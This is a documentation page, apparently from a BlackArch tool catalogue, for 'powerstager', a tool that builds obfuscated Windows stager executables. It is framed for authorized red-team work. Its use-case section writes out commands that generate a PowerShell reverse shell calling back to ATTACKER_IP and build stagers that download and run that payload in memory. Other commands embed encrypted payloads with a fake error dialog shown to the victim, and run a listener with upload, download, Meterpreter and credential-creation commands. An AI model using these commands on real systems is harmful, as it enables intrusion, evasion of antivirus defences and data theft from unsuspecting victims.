---
name: "powerstager"
categories:
  - blackarch-binary
version: "14.0149dc9"
homepage: "https://github.com/z0noxz/powerstager"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-13"
build-system: python
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "z0noxz/powerstager"
github-status: "gone"
github-match: "exact"
gh-checked: "2026-11-07"
worth: 4.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
---

# powerstager

> Generates obfuscated Windows stager executables that download, load, and run a PowerShell payload from a URL — plus a built-in reverse-shell listener.

## What it's for

Use this in authorized red-team work to build a small stager EXE that fetches a PowerShell payload you host yourself, loads it into memory, and executes it via obfuscated expression-call methods, so evasion logic lives on the hosting server rather than in the binary. The stager itself is encrypted to defeat dynamic signatures, can embed the payload instead of downloading it, and can display a fake error dialog to the victim. It cross-compiles Windows executables (win32/win64 targets) and therefore needs a MinGW-w64 cross toolchain and Python 3. It also ships its own listener with upload/download, system enumeration, and credential-creation commands for reverse-shell sessions. The original upstream repository (z0noxz/powerstager) has been taken down and the author asked for a new maintainer, so the packaged version is the last released snapshot; there is no live upstream to report issues to.

## Typical use cases

### Generate a PowerShell reverse-shell payload

Produce the payload script you will host for the stager to download.

```
powerstager --target win64 --reverse-shell --lhost ATTACKER_IP --lport 4444 --generate --output out.ps1
```

Outcome: writes `out.ps1`, a PowerShell script that connects back to `ATTACKER_IP:4444`; host it on a web server you control.

### Build a stager that downloads the payload

Compile the EXE whose only job is to fetch and execute the hosted script.

```
powerstager --target win64 --url http://ATTACKER_IP/out.ps1 --output out.exe
```

Outcome: cross-compiles `out.exe` (a win64 target here; win32 is also supported) that downloads the payload from the given URL into memory and runs it, keeping the payload off disk.

### Embed the payload with obfuscation and a decoy error

Bake a reverse shell directly into the stager with extra evasion.

```
powerstager --target win64 --reverse-shell --lhost ATTACKER_IP --lport 4444 --obfuscation --fake-error --output out.exe
```

Outcome: builds `out.exe` with the payload embedded (stored encrypted on disk, injected into memory at run time), additional obfuscation applied, and a fake error message displayed to the victim when it runs.

### Wrap a custom PowerShell script

Turn any PowerShell script of yours into a stager executable.

```
powerstager --target win64 --path input.ps1 --output out.exe
```

Outcome: embeds `input.ps1` into a newly generated `out.exe`, giving your arbitrary script the same in-memory execution behavior.

### Catch the reverse shell

Open the built-in listener the generated payloads call back to.

```
powerstager --listener --lport 4444
```

Outcome: starts a listener on port 4444; incoming sessions support commands such as `Local-Upload`, `Local-Download`, `Local-Enumerate-System`, `Local-Spawn-Meterpreter`, and `Local-Credential-Create`.

*No corpus evidence — derived from upstream documentation.*
